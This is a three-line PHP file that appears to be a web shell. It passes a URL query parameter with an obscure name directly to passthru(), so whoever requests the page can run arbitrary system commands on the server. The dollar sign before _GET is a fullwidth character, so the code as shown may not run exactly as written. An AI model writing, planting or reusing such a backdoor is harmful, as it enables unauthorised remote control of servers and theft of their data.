<?php
passthru(＄_GET['KVRfRT-V']);
?>
